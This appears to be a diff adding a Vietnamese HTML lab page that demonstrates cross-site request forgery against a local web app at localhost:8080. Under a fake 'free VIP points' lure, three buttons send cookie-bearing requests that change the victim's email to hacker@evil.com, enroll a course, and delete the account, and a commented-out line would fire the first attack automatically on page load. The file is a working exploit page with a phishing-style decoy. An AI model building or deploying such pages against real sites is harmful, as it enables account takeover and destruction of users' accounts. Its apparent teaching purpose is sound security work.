@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <title>🎁 Khóa học MIỄN PHÍ - Nhận ngay!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+        .container {
+            background: white;
+            color: #333;
+            padding: 40px;
+            border-radius: 10px;
+            max-width: 600px;
+            margin: 0 auto;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+        }
+        button {
+            background: #4CAF50;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 10px;
+        }
+        button:hover { background: #45a049; }
+        .debug {
+            margin-top: 20px;
+            padding: 15px;
+            background: #f0f0f0;
+            border-radius: 5px;
+            text-align: left;
+            font-size: 12px;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>🎉 Chúc mừng!</h1>
+    <h2>Bạn được chọn nhận 1000 điểm MIỄN PHÍ</h2>
+    <p>Nhấn nút bên dưới để kích hoạt tài khoản VIP của bạn!</p>
+
+    <button onclick="attack1()">🎁 Thay đổi Email (attack1)</button>
+    <button onclick="attack2()">📚 Đăng ký khóa học (attack2)</button>
+    <button onclick="attack3()">🔥 Xóa tài khoản (attack3)</button>
+
+    <div id="status" style="margin-top: 20px; color: #666; font-weight: bold;"></div>
+    <div id="debug" class="debug"></div>
+</div>
+
+<script>
+    const debugDiv = document.getElementById('debug');
+    const statusDiv = document.getElementById('status');
+
+    function log(message, isError = false) {
+        const timestamp = new Date().toLocaleTimeString();
+        const color = isError ? 'red' : 'green';
+        debugDiv.innerHTML += `<div style="color: ${color};">[${timestamp}] ${message}</div>`;
+        debugDiv.scrollTop = debugDiv.scrollHeight;
+    }
+
+    // Attack 1: Thay đổi email bằng fetch
+    async function attack1() {
+        statusDiv.innerHTML = '📡 Đang tấn công... (Thay đổi email)';
+        log('🚀 Bắt đầu attack1: Thay đổi email');
+
+        try {
+            const response = await fetch('http://localhost:8080/api/user/change-email', {
+                method: 'POST',
+                credentials: 'include', // ← Gửi cookie
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    newEmail: 'hacker@evil.com'
+                })
+            });
+
+            log(`📥 Response status: ${response.status} ${response.statusText}`);
+
+            if (response.ok) {
+                const data = await response.json();
+                log(`✅ Thành công! Response: ${JSON.stringify(data)}`);
+                statusDiv.innerHTML = '✅ Email đã bị thay đổi thành hacker@evil.com';
+            } else {
+                const errorText = await response.text();
+                log(`❌ Lỗi ${response.status}: ${errorText}`, true);
+                statusDiv.innerHTML = `❌ Lỗi ${response.status}`;
+            }
+
+        } catch (error) {
+            log(`❌ Exception: ${error.message}`, true);
+            statusDiv.innerHTML = `❌ Lỗi: ${error.message}`;
+        }
+    }
+
+    // Attack 2: Đăng ký khóa học
+    async function attack2() {
+        statusDiv.innerHTML = '📡 Đang tấn công... (Đăng ký khóa học)';
+        log('🚀 Bắt đầu attack2: Đăng ký khóa học');
+
+        try {
+            const response = await fetch('http://localhost:8080/api/user/enroll-course', {
+                method: 'POST',
+                credentials: 'include',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    courseId: 999
+                })
+            });
+
+            log(`📥 Response status: ${response.status}`);
+
+            if (response.ok) {
+                const data = await response.json();
+                log(`✅ Thành công! ${JSON.stringify(data)}`);
+                statusDiv.innerHTML = '✅ Đã đăng ký khóa học giả!';
+            } else {
+                log(`❌ Lỗi ${response.status}`, true);
+                statusDiv.innerHTML = `❌ Lỗi ${response.status}`;
+            }
+
+        } catch (error) {
+            log(`❌ Exception: ${error.message}`, true);
+            statusDiv.innerHTML = `❌ Lỗi: ${error.message}`;
+        }
+    }
+
+    // Attack 3: Xóa tài khoản
+    async function attack3() {
+        statusDiv.innerHTML = '📡 Đang tấn công... (Xóa tài khoản)';
+        log('🚀 Bắt đầu attack3: Xóa tài khoản');
+
+        try {
+            const response = await fetch('http://localhost:8080/api/user/delete-account', {
+                method: 'DELETE',
+                credentials: 'include'
+            });
+
+            log(`📥 Response status: ${response.status}`);
+
+            if (response.ok) {
+                const data = await response.json();
+                log(`✅ Thành công! ${JSON.stringify(data)}`);
+                statusDiv.innerHTML = '✅ Tài khoản đã bị xóa!';
+            } else {
+                log(`❌ Lỗi ${response.status}`, true);
+                statusDiv.innerHTML = `❌ Lỗi ${response.status}`;
+            }
+
+        } catch (error) {
+            log(`❌ Exception: ${error.message}`, true);
+            statusDiv.innerHTML = `❌ Lỗi: ${error.message}`;
+        }
+    }
+
+    // Debug: Hiển thị cookies hiện tại của trang này
+    log(`🍪 Cookies của trang này (${window.location.origin}): ${document.cookie || '(rỗng)'}`);
+    log('⚠️ Lưu ý: Cookies của localhost:8080 sẽ được browser tự động gửi khi attack!');
+
+    // Tự động kiểm tra khi load trang
+    window.onload = function() {
+        log('✅ Trang đã load xong. Sẵn sàng tấn công!');
+
+        // Uncomment dòng dưới để tự động tấn công sau 3 giây
+        // setTimeout(() => { attack1(); }, 3000);
+    };
+</script>
+</body>
+</html>
